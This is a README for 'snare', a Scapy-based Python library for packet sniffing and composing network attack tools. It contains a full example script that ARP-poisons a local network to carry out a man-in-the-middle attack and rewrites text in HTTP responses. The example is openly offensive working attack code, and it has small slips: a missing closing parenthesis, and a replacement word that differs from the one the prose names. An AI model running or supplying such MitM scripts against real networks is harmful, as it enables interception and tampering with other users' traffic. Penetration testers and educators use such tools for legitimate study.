snare
=====
**Capture and manipulate traffic off the network**

Snare provides a Sniffer class and a few "modules" which can be assembled to form attack tools.
These classes are based on Scapy and provide a convenient way to interact with and compose tools from it's functionality.

The advanced functions such as ARP poisoning, packet forwarding, and analysis are decomposed into modules to allow
for greater flexibility and flexibility. Look at the constructed strategies for examples of how to compose the modules.

Example
-------

Suppose you hate the string "search" and you want to MitM your local network, replacing all instances of the word in HTTP responses with the word "replace". Well the following script will do that for you!

.. code-block:: python

  import scapy.all as scapy
  import snare

  @snare.tcpfilter
  def inject(pkt):
      if all(layer in pkt for layer in (scapy.IP, scapy.TCP)):
          if scapy.Raw in pkt and pkt[scapy.TCP].sport == 80:

              s = b"search"
              r = b"replacement"

              raw = pkt[scapy.Raw]
              if s in raw.load:
                  raw.load = raw.load.replace(s, r)
                  print(pkt.show())
      return pkt

  sniffer = snare.Sniffer(iface="eth0")
  sniffer.register(
      snare.ArpMitmModule(filter=inject)
  )
  sniffer.start()
  input("Starting injection attack. Press enter to quit."
  sniffer.stop()
